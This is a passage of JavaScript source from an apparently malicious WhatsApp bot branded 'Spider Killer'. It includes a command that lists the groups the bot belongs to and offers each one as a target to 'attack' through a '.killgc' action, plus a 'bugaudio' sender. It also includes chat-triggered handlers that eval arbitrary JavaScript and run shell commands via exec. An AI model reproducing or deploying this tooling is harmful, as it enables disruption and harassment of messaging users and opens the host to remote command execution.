         ┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
         ┗━━━━━━━━━━━━━━━━━━━━━
    `);

    await sleep(2000);
    await sam.sendMessage(m.chat, {
        audio: bugaudio,
        mimetype: 'audio/mpeg'
    }, { quoted: m });
}
break;
case 'sgc': {
if (!isCreator) return
let imgsc = await prepareWAMessageMedia({
image: spider
}, {
upload: sam.waUploadToServer
})
let gcall = Object.values(await sam.groupFetchAllParticipating().catch(_=> null))
let rows = []
     

await gcall.forEach((u, i) => {
let anjay = {
header: u.subject,
title: `Attack Group | Status - ( ${u.announce == true ? "Group Closed" : "Group Open"} )`,
id: `.killgc ${u.id}`
};
rows.push(anjay)
});

var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: true
},
body: {
text: "S҉ P҉ I҉ D҉ E҉ R҉  K҉ I҉ L҉ L҉ E҉ R҉ "
},
footer: {
text: "! Select the group to attack "
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "S҉ P҉ I҉ D҉ E҉ R҉  V҉ 9",
sections: [{
title: "Only Open groups can be attacked",
rows: rows
}]
})
}],
messageParamsJson: ""
}
}
}
}
}), { userJid: m.chat, quoted: m })
sam.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
break
		

//============================================//
default:
}
}
if (budy.startsWith("=>")) {
if (!isCreator) return
try {
const result = await eval(`(async () => { return ${budy.slice(3)} })()`)
m.reply(util.format(result))
} catch (e) {
m.reply(String(e))
}
}
if (budy.startsWith(">")) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith("$")) {
if (!isCreator) return
exec(budy.slice(2),
(err, stdout) => {
if (err) return m.reply(err.toString())
if (stdout) return m.reply(stdout.toString())
})
}
} catch (err) {
const handleError = async () => {
sam.sendMessage(m.chat, {
text: require("util").format(err)
}, {
quoted: m
})
new Promise(resolve => setTimeout(resolve, 2000))
/*m.reply(`!Eror, error details will be sent to bot contributors ✓

${util.format(err)}`)*/
console.log(util.format(err))
}
handleError()
}
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(color(`Update ${__filename}`, "green"))
delete require.cache[file];
require(file);
});
